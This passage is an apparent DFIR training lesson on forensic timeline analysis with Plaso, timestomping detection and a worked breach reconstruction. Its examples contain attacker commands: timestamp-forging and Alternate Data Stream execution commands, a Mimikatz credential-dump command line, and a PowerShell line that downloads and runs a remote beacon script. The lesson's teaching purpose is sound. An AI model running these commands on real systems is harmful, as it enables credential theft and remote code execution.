{
  "lesson_id": "c8f5d3a2-9b7e-4d1c-8e3f-6a9c2b4d7e51",
  "domain": "dfir",
  "title": "Timeline Analysis and Incident Reconstruction",
  "difficulty": 3,
  "order_index": 8,
  "prerequisites": [
    "dfir_01",
    "dfir_03",
    "dfir_04"
  ],
  "concepts": [
    "Super Timeline Creation",
    "MACB Timestamps (Modified, Accessed, Changed, Born)",
    "Plaso and Log2Timeline",
    "Timeline Explorer Analysis",
    "Cross-Source Correlation",
    "Timestomping Detection",
    "Evidence Sequencing",
    "Attack Timeline Reconstruction",
    "Timezone Handling in Forensics",
    "Artifact Pivoting Techniques"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Master timeline creation using Plaso (log2timeline) for comprehensive artifact collection",
    "Understand MACB timestamp semantics and detect timestamp manipulation (timestomping)",
    "Correlate evidence across multiple sources (filesystem, registry, event logs, prefetch, browser history)",
    "Reconstruct attacker activities from initial compromise to exfiltration",
    "Handle timezone conversions and identify timezone anomalies in forensic timelines",
    "Use Timeline Explorer to filter, search, and visualize forensic timelines",
    "Apply artifact pivoting to expand investigations from initial indicators",
    "Build courtroom-ready incident timelines with evidence citations"
  ],
  "content_blocks": [
    {
      "type": "mindset_coach",
      "content": {
        "text": "🕰️ **Welcome to Timeline Analysis: Where Every Second Tells the Story**\n\nImagine you're investigating a burglary. You have security camera footage, alarm logs, witness statements, and physical evidence—but they're all scattered across different sources and time zones. Your job? Piece them together into a coherent timeline: *When did the burglar arrive? What did they do first? When did they leave?*\n\n**Timeline analysis** is exactly that, but for cyber incidents. Instead of camera footage, you have filesystem timestamps, Windows Event Logs, registry modifications, browser history, and network connection logs. Your mission: **Reconstruct the attack from start to finish, second by second.**\n\n**Why This Matters**: A timeline answers the critical questions that leadership, legal teams, and regulators ask:\n- **When** did the breach occur?\n- **How long** did the attacker have access?\n- **What** data was accessed/exfiltrated?\n- **Who** (which accounts) were compromised?\n- **How** did the attacker move laterally?\n\nWithout a timeline, you have isolated facts. With a timeline, you have a *story*—and stories are what convict criminals in court and satisfy auditors in breach reports.\n\n**Jim Kwik Principle - The Power of Visualization**: Your brain excels at understanding sequences and patterns. When you see events plotted on a timeline (\"8:32 AM: Initial phishing email → 8:45 AM: Macro executed → 8:46 AM: PowerShell C2 connection\"), the attack narrative becomes crystal clear. This lesson will teach you to transform raw forensic artifacts into visual timelines that reveal the truth.\n\n**Your Mission Today**: You'll learn to create super timelines (combining all artifacts into one unified view), detect timestamp manipulation, correlate evidence across sources, and reconstruct complex attacks. By the end, you'll be able to answer \"What happened?\" with precision and proof. Let's build timelines that win cases! 🚀"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "## What is Timeline Analysis?\n\n**Timeline analysis** is the process of organizing forensic artifacts chronologically to reconstruct events during a security incident or investigation.\n\n### Why Timelines Are Critical in DFIR\n\n1. **Establishes Sequence of Events**: \"Malware executed BEFORE credentials were stolen, so initial access wasn't via stolen creds\"\n2. **Identifies Scope**: \"Attacker had access for 47 days before detection\"\n3. **Proves Causation**: \"User clicked email at 2:15 PM, malware callback at 2:16 PM—email was the entry point\"\n4. **Detects Anomalies**: \"File creation timestamp is AFTER its modification timestamp—timestomping!\"\n5. **Supports Legal Cases**: Courts require precise timelines with evidence citations\n6. **Answers Business Questions**: \"Was customer data accessed? Yes, exfiltrated between 2:00-2:45 PM on Tuesday\"\n\n### Types of Timelines\n\n#### 1. Micro Timeline (Single Artifact Type)\n- **Example**: All Windows Event Logs from one system\n- **Use Case**: Focused analysis (e.g., \"Show me all logon attempts\")\n- **Tool**: Event Viewer, PowerShell queries\n\n#### 2. System Timeline (Single System, All Artifacts)\n- **Example**: All filesystem, registry, and event log activity from one workstation\n- **Use Case**: \"What happened on this compromised machine?\"\n- **Tool**: Plaso, FTK Imager Timeline\n\n#### 3. Super Timeline (Multiple Systems, All Artifacts)\n- **Example**: Workstation + Domain Controller + File Server + Network logs\n- **Use Case**: Enterprise breach investigation\n- **Tool**: Plaso (log2timeline), Splunk, Timesketch\n\n**Best Practice**: Start with super timeline, then filter down to specific systems/artifacts as needed.\n\n### MACB Timestamps: The Foundation of Timeline Analysis\n\n**MACB** stands for **M**odified, **A**ccessed, **C**hanged, **B**orn (created).\n\n#### Windows (NTFS) Timestamps\n\n```\n┌──────────────────────────────────────────────────────┐\n│           NTFS FILE TIMESTAMPS                       │\n├──────────────────────────────────────────────────────┤\n│ STANDARD_INFORMATION ($SI) Attribute:                │\n│   - Modified (M): Content last changed               │\n│   - Accessed (A): File last opened/read              │\n│   - Changed (C): Metadata changed (permissions, etc.)│\n│   - Born (B): File creation time                     │\n│                                                      │\n│ FILE_NAME ($FN) Attribute:                           │\n│   - Modified (M): (same as above)                    │\n│   - Accessed (A): (same as above)                    │\n│   - Changed (C): MFT entry metadata changed          │\n│   - Born (B): (same as above)                        │\n└──────────────────────────────────────────────────────┘\n```\n\n**Key Insight**: NTFS stores timestamps in TWO places:\n1. **$STANDARD_INFORMATION** (easy to modify with tools like `timestomp`)\n2. **$FILE_NAME** (harder to modify, requires direct MFT manipulation)\n\n**Timestomping Detection**: If `$SI` timestamps don't match `$FILE_NAME` timestamps → File has been tampered with!\n\n#### Linux (ext4) Timestamps\n\n```\nFile: /var/log/auth.log\n  Access: 2025-10-27 14:30:00 (atime)\n  Modify: 2025-10-27 14:25:00 (mtime)\n  Change: 2025-10-27 14:25:00 (ctime)\n  Birth:  2025-10-20 08:00:00 (crtime, if supported)\n```\n\n- **atime**: Last access (read/open)\n- **mtime**: Last modification (content changed)\n- **ctime**: Last change (metadata/permissions changed)\n- **crtime**: Creation time (birth, ext4/ZFS only)\n\n**Note**: Many Linux systems disable atime updates (performance) via `noatime` mount option.\n\n### Common Forensic Artifacts for Timeline Analysis\n\n| Artifact | What It Reveals | Timestamp Source |\n|----------|----------------|------------------|\n| **$MFT (Master File Table)** | File create/modify/access/delete | MACB timestamps |\n| **Windows Event Logs** | Logons, process creation, service installs | Event TimeCreated |\n| **Registry** | Persistence mechanisms, user activity | Registry key LastWriteTime |\n| **Prefetch** | Application execution history (last 8 runs) | Prefetch file timestamps |\n| **ShimCache** | Executables run on system | Registry LastWriteTime |\n| **AmCache** | Installed applications, first run time | FirstInstallation time |\n| **USN Journal** | File system changes (create, delete, rename) | USN Timestamp |\n| **Browser History** | Websites visited, downloads | Visit timestamp |\n| **LNK Files (Shortcuts)** | Files opened, target paths | MAC timestamps |\n| **Recycle Bin ($I files)** | Deleted files, deletion time | $I file creation |\n| **Volume Shadow Copies** | Historical snapshots of file system | VSS creation time |\n\n**Memory Anchor - SUPER TIMELINE**: **S**ystem files (MFT), **U**SN Journal, **P**refetch, **E**vent Logs, **R**egistry, **T**emporary files (browser cache), **I**nternet history, **M**emory dumps, **E**mail, **L**NK files, **I**nstalled apps (AmCache), **N**etwork logs, **E**xternal device logs (USB)."
      }
    },
    {
      "type": "video",
      "content": {
        "title": "Video: Timeline Analysis and Incident Reconstruction Overview",
        "url": "https://www.youtube.com/embed/Vh_h6NfLkAg",
        "description": "Watch this video for a visual introduction to the concepts covered in this lesson."
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "## Creating Super Timelines with Plaso (log2timeline)\n\n**Plaso** (short for \"Plaso Langar Að Safna Öllu\", Icelandic for \"super timeline all the things\") is the industry-standard tool for creating forensic timelines.\n\n### Installation\n\n```bash\n# Ubuntu/Debian\nsudo add-apt-repository ppa:gift/stable\nsudo apt update\nsudo apt install plaso-tools\n\n# Verify installation\nlog2timeline.py --version\n```\n\n### Basic Workflow\n\n```\n1. COLLECT → Image disk/acquire artifacts\n2. PARSE   → log2timeline.py (create Plaso database)\n3. FILTER  → psort.py (filter and export timeline)\n4. ANALYZE → Timeline Explorer / Timesketch (visualize and investigate)\n```\n\n### Step 1: Collect Evidence\n\n```bash\n# Acquire disk image (or mount existing image)\nsudo dd if=/dev/sda of=/cases/case001/evidence.dd bs=4M status=progress\n\n# OR use FTK Imager (Windows GUI)\n# OR acquire specific artifacts only (faster for live response)\n```\n\n### Step 2: Parse with log2timeline.py\n\n**Full Disk Image Parsing**:\n```bash\n# Parse entire disk image (takes hours for large disks)\nlog2timeline.py \\\n  --storage_file /cases/case001/timeline.plaso \\\n  /cases/case001/evidence.dd\n\n# Example output:\n[INFO] Processing: /cases/case001/evidence.dd\n[INFO] Extracting: Windows Event Logs (42,315 events)\n[INFO] Extracting: MFT entries (1,245,678 files)\n[INFO] Extracting: Registry keys (89,234 keys)\n[INFO] Extracting: Prefetch files (312 executables)\n[INFO] Extracting: Browser history (15,432 URLs)\n[INFO] Total events: 1,392,971\n[INFO] Timeline saved to timeline.plaso\n```\n\n**Targeted Parsing (Faster)**:\n```bash\n# Parse only specific artifacts (when time is critical)\nlog2timeline.py \\\n  --storage_file /cases/case001/timeline.plaso \\\n  --parsers \"winevt,mft,prefetch,webhist\" \\\n  /cases/case001/evidence.dd\n\n# Available parsers:\n# - winevt: Windows Event Logs\n# - mft: NTFS Master File Table\n# - prefetch: Windows Prefetch\n# - webhist: Browser history (Chrome, Firefox, IE, Edge)\n# - winreg: Windows Registry\n# - recycle_bin: Recycle Bin artifacts\n# - userassist: UserAssist (tracks GUI app usage)\n# - lnk: Windows Shortcuts\n# - amcache: AmCache (installed apps)\n```\n\n**Live Filesystem Parsing** (no image needed):\n```bash\n# Parse running Windows system (run as Administrator)\nlog2timeline.py \\\n  --storage_file C:\\Cases\\timeline.plaso \\\n  C:\\\n\n# Linux system\nsudo log2timeline.py \\\n  --storage_file /cases/timeline.plaso \\\n  /\n```\n\n### Step 3: Filter and Export with psort.py\n\n**Export to CSV** (for Timeline Explorer):\n```bash\npsort.py \\\n  -o l2tcsv \\\n  -w /cases/case001/timeline.csv \\\n  /cases/case001/timeline.plaso\n\n# Result: timeline.csv (1.4M events, ~500 MB)\n```\n\n**Filter by Date Range**:\n```bash\n# Only events from Oct 27, 2025\npsort.py \\\n  -o l2tcsv \\\n  -w /cases/case001/timeline_oct27.csv \\\n  /cases/case001/timeline.plaso \\\n  \"date >= '2025-10-27 00:00:00' AND date <= '2025-10-27 23:59:59'\"\n```\n\n**Filter by Source Type**:\n```bash\n# Only Windows Event Logs\npsort.py \\\n  -o l2tcsv \\\n  -w /cases/case001/timeline_evtx.csv \\\n  /cases/case001/timeline.plaso \\\n  \"parser is 'winevt'\"\n\n# Only file system activity (MFT)\npsort.py \\\n  -o l2tcsv \\\n  -w /cases/case001/timeline_mft.csv \\\n  /cases/case001/timeline.plaso \\\n  \"parser is 'mft'\"\n```\n\n**Filter by Keyword**:\n```bash\n# All events containing \"powershell\"\npsort.py \\\n  -o l2tcsv \\\n  -w /cases/case001/timeline_powershell.csv \\\n  /cases/case001/timeline.plaso \\\n  \"powershell\"\n\n# All events with IP address\npsort.py \\\n  -o l2tcsv \\\n  -w /cases/case001/timeline_network.csv \\\n  /cases/case001/timeline.plaso \\\n  \"192.168.1.100\"\n```\n\n### Step 4: Analyze with Timeline Explorer\n\n**Timeline Explorer** (by Eric Zimmerman) is a powerful CSV viewer optimized for forensic timelines.\n\n**Download**: https://ericzimmerman.github.io/#!index.md\n\n**Key Features**:\n1. **Fast filtering**: Filter 1M+ rows instantly\n2. **Column highlighting**: Color-code suspicious events\n3. **Regex search**: Find patterns (e.g., `.*\\.ps1$` for PowerShell scripts)\n4. **Time grouping**: Group events by minute/hour/day\n5. **Tag events**: Mark important findings\n\n**Workflow in Timeline Explorer**:\n```\n1. Open timeline.csv\n2. Filter by date range (focus on incident timeframe)\n3. Search for IOCs (IP addresses, file names, user accounts)\n4. Tag suspicious events (malware execution, lateral movement)\n5. Export tagged events for reporting\n```\n\n### Alternative: Timesketch (Enterprise Timeline Analysis)\n\n**Timesketch** is an open-source collaborative timeline analysis tool (developed by Google).\n\n**Features**:\n- Web-based (multi-analyst collaboration)\n- Supports multiple timelines per case\n- Automatic enrichment (VirusTotal, MISP threat intel)\n- Saved searches and annotations\n- Graph visualization (relationships between entities)\n\n**Installation**:\n```bash\n# Docker (easiest)\ngit clone https://github.com/google/timesketch.git\ncd timesketch\ndocker-compose up -d\n\n# Access at http://localhost:5000\n```\n\n**Import Plaso timeline**:\n```bash\n# Upload timeline.plaso via web interface\n# OR use timesketch_importer:\ntimesketch_importer \\\n  --timeline_name \"Case001_Workstation\" \\\n  /cases/case001/timeline.plaso\n```"
      }
    },
    {
      "type": "diagram",
      "content": {
        "text": "## Timeline Analysis Workflow\n\n```\n┌──────────────────────────────────────────────────────────┐\n│             INCIDENT: Ransomware Attack                  │\n│         User reports encrypted files at 3:00 PM          │\n└───────────────────────┬──────────────────────────────────┘\n                        ↓\n           ┌────────────────────────────┐\n           │  1. EVIDENCE COLLECTION    │\n           │  - Disk image (evidence.dd)│\n           │  - Memory dump             │\n           │  - Network logs (PCAP)     │\n           └────────────┬───────────────┘\n                        ↓\n           ┌────────────────────────────┐\n           │  2. TIMELINE CREATION      │\n           │  log2timeline.py \\         │\n           │    evidence.dd             │\n           │  → timeline.plaso          │\n           │  (1.4M events)             │\n           └────────────┬───────────────┘\n                        ↓\n           ┌────────────────────────────┐\n           │  3. EXPORT & FILTER        │\n           │  psort.py -o l2tcsv \\      │\n           │    timeline.plaso          │\n           │  → timeline.csv            │\n           └────────────┬───────────────┘\n                        ↓\n           ┌────────────────────────────┐\n           │  4. INITIAL ANALYSIS       │\n           │  Timeline Explorer:        │\n           │  - Filter 2:30-3:30 PM     │\n           │  - Search \"encrypt\"        │\n           │  - Search \".exe\" created   │\n           └────────────┬───────────────┘\n                        ↓\n     ┌──────────────────┴───────────────────┐\n     │    5. PIVOT TO KEY EVENTS            │\n     └──────────────────┬───────────────────┘\n                        ↓\n  ┌──────────────────────┴────────────────────────┐\n  │                                               │\n  ↓                                               ↓\n┌────────────────────┐                  ┌────────────────────┐\n│ 2:45 PM            │                  │ 2:47 PM            │\n│ Email received     │                  │ Macro executed     │\n│ from external      │──────────────────→│ WINWORD.EXE →     │\n│ invoice.doc        │                  │ powershell.exe     │\n└────────────────────┘                  └────────┬───────────┘\n                                                 │\n                                                 ↓\n                                        ┌────────────────────┐\n                                        │ 2:48 PM            │\n                                        │ Malware download   │\n                                        │ GET /evil.exe      │\n                                        │ from 45.142.212.61 │\n                                        └────────┬───────────┘\n                                                 │\n                                                 ↓\n                                        ┌────────────────────┐\n                                        │ 2:50 PM - 3:15 PM  │\n                                        │ File encryption    │\n                                        │ 12,453 files .enc  │\n                                        │ Ransom note dropped│\n                                        └────────────────────┘\n                                                 ↓\n           ┌─────────────────────────────────────────────────┐\n           │  6. RECONSTRUCTED TIMELINE                      │\n           ├─────────────────────────────────────────────────┤\n           │  2:45:12 PM - Phishing email received           │\n           │  2:47:03 PM - User opened invoice.doc           │\n           │  2:47:05 PM - Macro executed (Event ID 4688)    │\n           │  2:47:06 PM - PowerShell spawned by WINWORD     │\n           │  2:48:15 PM - evil.exe downloaded (MFT created) │\n           │  2:48:20 PM - evil.exe executed (Prefetch)      │\n           │  2:50:00 PM - Encryption started (file .modified)│\n           │  3:15:32 PM - Ransom note created (README.txt)  │\n           │  3:17:00 PM - User noticed and reported         │\n           │                                                 │\n           │  DWELL TIME: 2 minutes (initial access→encrypt) │\n           │  IMPACT: 12,453 files encrypted in 25 minutes   │\n           └─────────────────────────────────────────────────┘\n```"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "## Timestomping Detection and Anti-Forensics\n\n**Timestomping** is when attackers modify file timestamps to:\n1. Hide when malware was created (backdating to look like system file)\n2. Evade detection rules (\"alert if .exe created in last 24 hours\")\n3. Frame innocent parties (\"this file was created before I had access\")\n\n### How Timestomping Works\n\n**Windows - Simple Method** (modifies $STANDARD_INFORMATION only):\n```powershell\n# PowerShell: Change creation time\n$file = Get-Item C:\\malware.exe\n$file.CreationTime = \"2020-01-01 00:00:00\"\n$file.LastWriteTime = \"2020-01-01 00:00:00\"\n$file.LastAccessTime = \"2020-01-01 00:00:00\"\n```\n\n**Metasploit's timestomp** (more sophisticated):\n```bash\nmeterpreter > timestomp C:\\\\malware.exe -m \"01/01/2020 00:00:00\"\n[*] Setting MACE attributes on C:\\\\malware.exe\n```\n\n**Linux - touch command**:\n```bash\n# Change modification and access time\ntouch -t 202001010000 malware.sh\n```\n\n### Detection Techniques\n\n#### 1. $SI vs $FN Timestamp Mismatch (Windows)\n\n**Why This Works**: Most timestomping tools only modify the `$STANDARD_INFORMATION` attribute (easy to access). The `$FILE_NAME` attribute (stored in MFT) is harder to modify.\n\n**Detection**:\n```bash\n# Parse MFT with MFTECmd (Eric Zimmerman)\nMFTECmd.exe -f \"C:\\$MFT\" --csv . --csvf mft_analysis.csv\n\n# Open in Timeline Explorer and filter:\n# Where SI_Created != FN_Created OR SI_Modified != FN_Modified\n```\n\n**Example**:\n```\nFile: C:\\Windows\\System32\\malware.exe\n$STANDARD_INFORMATION Created:  2020-01-01 00:00:00  ← Timestomped!\n$FILE_NAME Created:             2025-10-27 14:32:15  ← Real timestamp\n\nConclusion: File was created on 2025-10-27 but timestomped to look old\n```\n\n#### 2. Created > Modified Anomaly\n\nLogically, a file's **creation time** should be ≤ **modification time**. If created > modified, timestamps were manipulated.\n\n**Example**:\n```\nFile: update.exe\nCreated:  2025-10-27 15:00:00\nModified: 2025-10-27 14:30:00  ← Modified BEFORE created? Impossible!\n\nConclusion: Timestamps were tampered with\n```\n\n**Timeline Explorer Filter**:\n```\nCreated > Modified\n```\n\n#### 3. Filesystem Journal Analysis (NTFS)\n\nThe **USN Journal** (`$UsnJrnl:$J`) logs all file system changes with timestamps that CANNOT be easily modified.\n\n**Parse USN Journal**:\n```bash\n# Extract USN Journal\nMFTECmd.exe -f \"C:\\$Extend\\$UsnJrnl:$J\" --csv . --csvf usn_journal.csv\n\n# Check if file creation in USN Journal matches MFT timestamp\n```\n\nIf USN Journal shows file created at 15:00 but MFT shows 2020-01-01 → Timestomped.\n\n#### 4. Nanosecond Precision Analysis\n\nWindows NTFS timestamps have **100-nanosecond precision**. When attackers manually set timestamps, they often use rounded values (e.g., \"2020-01-01 00:00:00.0000000\").\n\nLegitimate files have random nanoseconds:\n```\nLegitimate file:  2025-10-27 14:32:15.8937428\nTimestomped file: 2020-01-01 00:00:00.0000000  ← Suspiciously round!\n```\n\n#### 5. Correlation with Other Artifacts\n\n**Example**:\n```\nFile: malware.exe (Created: 2020-01-01 per $SI)\n\nBut:\n- Prefetch: malware.exe first run on 2025-10-27 14:35:00\n- Event Log 4688: malware.exe process created on 2025-10-27 14:35:00\n- AmCache: malware.exe first install on 2025-10-27 14:35:00\n\nConclusion: File timestamp is fake. Real creation was 2025-10-27.\n```\n\n**Always cross-reference** MFT timestamps with:\n- Prefetch (first run time)\n- Windows Event Logs (process creation)\n- AmCache (first install)\n- ShimCache (execution time)\n- USN Journal (file system changes)\n\n### Other Anti-Forensics Techniques\n\n#### 1. File Wiping (Secure Delete)\n\nAttackers use tools like **SDelete** (Sysinternals) to overwrite deleted files, preventing recovery.\n\n**Detection**:\n- High volume of file writes followed by deletions (USN Journal)\n- Suspicious processes (sdelete.exe, shred, wipe.exe) in process history\n\n#### 2. Log Clearing\n\nAttackers clear Windows Event Logs to hide their activities.\n\n**Detection**:\n```powershell\n# Event ID 1102: Security log was cleared\nGet-WinEvent -FilterHashtable @{LogName='Security'; ID=1102}\n\n# Event ID 104: System log was cleared\nGet-WinEvent -FilterHashtable @{LogName='System'; ID=104}\n```\n\n**If you see Event 1102/104** → Attacker tried to cover tracks (but couldn't delete the \"log cleared\" event itself!).\n\n#### 3. Alternate Data Streams (ADS)\n\nAttackers hide malware in NTFS Alternate Data Streams (invisible in normal directory listings).\n\n**Example**:\n```cmd\n# Create malware in ADS of legitimate file\ntype malware.exe > legitimate.txt:hidden.exe\n\n# Execute from ADS\nwmic process call create \"C:\\legitimate.txt:hidden.exe\"\n```\n\n**Detection**:\n```bash\n# MFTECmd shows ADS\nMFTECmd.exe -f \"C:\\$MFT\" --csv . --csvf mft.csv\n\n# Filter for ADS: FileName contains \":\" (excluding :$DATA)\n```\n\n#### 4. Run Keys / Scheduled Tasks Backdating\n\nAttackers create persistence (registry Run keys, scheduled tasks) and backdate timestamps.\n\n**Detection**:\n- Compare registry LastWriteTime with other artifacts\n- Check Task Scheduler logs (Event ID 106: Task registered)"
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "## Hands-On: Reconstructing a Lateral Movement Attack\n\n### Scenario\nYou're investigating a breach at a financial company. The attacker compromised an employee workstation, moved laterally to the domain controller, and exfiltrated the Active Directory database (ntds.dit). Your job: **Build a complete timeline showing the attack path.**\n\n**Evidence Available**:\n- Disk image: `workstation.dd` (initial compromise)\n- Disk image: `domaincontroller.dd` (lateral movement target)\n- Network logs: `traffic.pcap` (contains lateral movement traffic)\n\n### Step 1: Create Super Timelines\n\n```bash\n# Parse workstation (initial compromise)\nlog2timeline.py \\\n  --storage_file /cases/breach/workstation.plaso \\\n  --parsers \"winevt,mft,prefetch,webhist,winreg,lnk,recycle_bin\" \\\n  /evidence/workstation.dd\n\n# Export to CSV\npsort.py -o l2tcsv \\\n  -w /cases/breach/workstation_timeline.csv \\\n  /cases/breach/workstation.plaso\n\n# Repeat for domain controller\nlog2timeline.py \\\n  --storage_file /cases/breach/dc.plaso \\\n  --parsers \"winevt,mft,prefetch,winreg\" \\\n  /evidence/domaincontroller.dd\n\npsort.py -o l2tcsv \\\n  -w /cases/breach/dc_timeline.csv \\\n  /cases/breach/dc.plaso\n```\n\n### Step 2: Identify Initial Compromise (Workstation)\n\n**Open in Timeline Explorer**: `workstation_timeline.csv`\n\n**Filter 1: Browser Downloads (Likely Phishing)**\n```\nSource Type: webhist\nDescription contains: \"download\"\nTimestamp: Last 7 days\n```\n\n**Finding**:\n```\nTimestamp: 2025-10-20 14:32:15\nSource: Chrome History\nURL: https://malicious-invoice-portal.com/invoice_Oct2025.exe\nFile: C:\\Users\\jsmith\\Downloads\\invoice_Oct2025.exe\n```\n\n**TAG THIS EVENT**: \"Initial Malware Download\"\n\n**Filter 2: Executable Creation in Downloads**\n```\nSource Type: mft\nFilename contains: \".exe\"\nPath contains: \"Downloads\"\nMACB Type: Birth (created)\n```\n\n**Finding**:\n```\nTimestamp: 2025-10-20 14:32:18\nFile: C:\\Users\\jsmith\\Downloads\\invoice_Oct2025.exe\nSize: 245,760 bytes\nMD5: 44d88612fea8a8f36de82e1278abb02f\n```\n\n**Cross-check with VirusTotal**: MD5 matches known malware (Cobalt Strike stager)\n\n### Step 3: Identify Malware Execution\n\n**Filter 3: Prefetch for invoice_Oct2025.exe**\n```\nSource Type: prefetch\nFilename: invoice_Oct2025.exe\n```\n\n**Finding**:\n```\nTimestamp: 2025-10-20 14:35:42 (First Run)\nPrefetch: INVOICE_OCT2025.EXE-A1B2C3D4.pf\nRun Count: 1\nFiles Accessed:\n  - C:\\Windows\\System32\\cmd.exe\n  - C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n```\n\n**Interpretation**: Malware spawned cmd.exe and PowerShell (likely for C2)\n\n**Filter 4: Process Creation (Event ID 4688)**\n```\nSource Type: winevt\nEvent ID: 4688\nTimestamp: Around 14:35:42\n```\n\n**Finding**:\n```\nTimestamp: 2025-10-20 14:35:43\nEvent ID: 4688 (Process Creation)\nProcess: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParent: C:\\Users\\jsmith\\Downloads\\invoice_Oct2025.exe\nCommand Line: powershell.exe -NoP -W Hidden -Enc <base64>\n```\n\n**Decode Base64**:\n```bash\necho \"<base64>\" | base64 -d\n# Result: IEX (New-Object Net.WebClient).DownloadString('http://45.142.212.61/beacon.ps1')\n```\n\n**TAG THIS**: \"Cobalt Strike Beacon Download\"\n\n### Step 4: Identify Credential Dumping\n\n**Filter 5: Mimikatz Execution (Known IOCs)**\n```\nDescription contains: \"mimikatz\" OR \"sekurlsa\" OR \"lsass\"\n```\n\n**Finding**:\n```\nTimestamp: 2025-10-20 15:10:22\nEvent ID: 4688\nProcess: C:\\Windows\\Temp\\m64.exe\nParent: powershell.exe\nCommand Line: m64.exe privilege::debug sekurlsa::logonpasswords\n```\n\n**Interpretation**: Attacker renamed Mimikatz to `m64.exe` and dumped credentials\n\n**Filter 6: LSASS Access (Credential Theft)**\n```\nEvent ID: 4656 (Handle to Object Requested)\nObject Name: lsass.exe\n```\n\n**Finding**: `m64.exe` accessed `lsass.exe` (Windows credential storage process)\n\n### Step 5: Identify Lateral Movement\n\n**Filter 7: Network Logons to Domain Controller**\n```\nEvent ID: 4624 (Logon)\nLogon Type: 3 (Network)\nSource Address: 10.0.0.50 (workstation IP)\n```\n\n**Finding**:\n```\nTimestamp: 2025-10-20 15:25:18\nEvent ID: 4624\nLogon Type: 3 (Network)\nAccount: CORP\\admin_backup\nSource IP: 10.0.0.50\nTarget: CORP-DC01 (10.0.0.10)\n```\n\n**Interpretation**: Attacker used stolen `admin_backup` credentials to access DC\n\n**Check Network Logs (PCAP)**:\n```bash\ntshark -r traffic.pcap -Y \"ip.src == 10.0.0.50 && ip.dst == 10.0.0.10\" \\\n  -T fields -e frame.time -e tcp.port -e smb2.filename\n\n# Output:\n2025-10-20 15:25:20  445  \\\\CORP-DC01\\ADMIN$\n2025-10-20 15:25:22  445  \\\\CORP-DC01\\C$\\Windows\\Temp\\ntdsutil.exe\n```\n\n**Interpretation**: Attacker copied `ntdsutil.exe` to DC (likely for AD extraction)\n\n### Step 6: Identify Data Exfiltration (Domain Controller)\n\n**Open**: `dc_timeline.csv` in Timeline Explorer\n\n**Filter 8: NTDS.dit Access**\n```\nFilename: ntds.dit\nMACB Type: Accessed\n```\n\n**Finding**:\n```\nTimestamp: 2025-10-20 15:30:45\nFile: C:\\Windows\\NTDS\\ntds.dit\nMACB: Accessed\nProcess: (from Event ID 4663): ntdsutil.exe\n```\n\n**Filter 9: Shadow Copy Creation (NTDS Extraction Technique)**\n```\nEvent ID: 7036 (Service state change)\nService: Volume Shadow Copy\n```\n\n**Finding**:\n```\nTimestamp: 2025-10-20 15:30:40\nEvent ID: 7036\nService: VSS (Volume Shadow Copy)\nState: Running → Attacker created shadow copy to bypass file locks\n```\n\n**Filter 10: Large File Creation (Staged Exfil)**\n```\nPath: C:\\Windows\\Temp\nSize: > 100 MB\n```\n\n**Finding**:\n```\nTimestamp: 2025-10-20 15:32:10\nFile: C:\\Windows\\Temp\\backup.zip\nSize: 1.2 GB\nContains: ntds.dit, SYSTEM registry hive (for decryption)\n```\n\n**Network Logs**:\n```bash\ntshark -r traffic.pcap -Y \"ip.src == 10.0.0.10 && tcp.len > 1000000\" \\\n  -T fields -e frame.time -e ip.dst -e http.request.uri\n\n# Output:\n2025-10-20 15:35:00  185.220.101.32  POST /upload\n# 1.2 GB uploaded to external IP (Tor exit node)\n```\n\n### Step 7: Reconstructed Timeline\n\n```\n┌────────────────────────────────────────────────────────────────┐\n│           ATTACK TIMELINE - LATERAL MOVEMENT BREACH           │\n├────────────────────────────────────────────────────────────────┤\n│ 2025-10-20 14:32:15 │ User downloads invoice_Oct2025.exe       │\n│                     │ (Cobalt Strike stager)                   │\n├─────────────────────┼──────────────────────────────────────────┤\n│ 2025-10-20 14:35:42 │ Malware executed, spawns PowerShell      │\n├─────────────────────┼──────────────────────────────────────────┤\n│ 2025-10-20 14:35:43 │ PowerShell downloads Beacon from         │\n│                     │ 45.142.212.61 (C2 server)                │\n├─────────────────────┼──────────────────────────────────────────┤\n│ 2025-10-20 15:10:22 │ Mimikatz executed (m64.exe)              │\n│                     │ Credentials dumped from LSASS            │\n├─────────────────────┼──────────────────────────────────────────┤\n│ 2025-10-20 15:25:18 │ Network logon to DC (CORP\\admin_backup)  │\n│                     │ From: 10.0.0.50 → To: 10.0.0.10          │\n├─────────────────────┼──────────────────────────────────────────┤\n│ 2025-10-20 15:25:22 │ ntdsutil.exe copied to DC via SMB        │\n├─────────────────────┼──────────────────────────────────────────┤\n│ 2025-10-20 15:30:40 │ Volume Shadow Copy created (bypass locks)│\n├─────────────────────┼──────────────────────────────────────────┤\n│ 2025-10-20 15:30:45 │ NTDS.dit extracted from shadow copy      │\n├─────────────────────┼──────────────────────────────────────────┤\n│ 2025-10-20 15:32:10 │ backup.zip created (1.2 GB, ntds.dit)    │\n├─────────────────────┼──────────────────────────────────────────┤\n│ 2025-10-20 15:35:00 │ Data exfiltrated to 185.220.101.32       │\n│                     │ (Tor exit node, 1.2 GB upload)           │\n└─────────────────────┴──────────────────────────────────────────┘\n\nDWELL TIME: 1 hour 3 minutes (initial access → exfiltration)\nSCOPE: 1 workstation + 1 domain controller compromised\nDATA STOLEN: Entire Active Directory database (all password hashes)\n```\n\n### Step 8: Extract IOCs for Threat Hunting\n\n```python\niocs = {\n  \"malware_hashes\": [\n    \"44d88612fea8a8f36de82e1278abb02f\"  # invoice_Oct2025.exe\n  ],\n  \"c2_servers\": [\n    \"45.142.212.61\",  # Cobalt Strike C2\n    \"185.220.101.32\"  # Exfiltration server (Tor)\n  ],\n  \"domains\": [\n    \"malicious-invoice-portal.com\"\n  ],\n  \"file_paths\": [\n    \"C:\\\\Windows\\\\Temp\\\\m64.exe\",  # Mimikatz\n    \"C:\\\\Windows\\\\Temp\\\\backup.zip\",  # Exfil package\n    \"C:\\\\Users\\\\jsmith\\\\Downloads\\\\invoice_Oct2025.exe\"\n  ],\n  \"compromised_accounts\": [\n    \"CORP\\\\admin_backup\"\n  ],\n  \"lateral_movement\": {\n    \"source\": \"10.0.0.50\",\n    \"target\": \"10.0.0.10\",\n    \"method\": \"SMB with stolen credentials\"\n  }\n}\n```\n\n**Next Steps**:\n1. Block C2 IPs at firewall\n2. Reset `admin_backup` password and revoke all sessions\n3. Threat 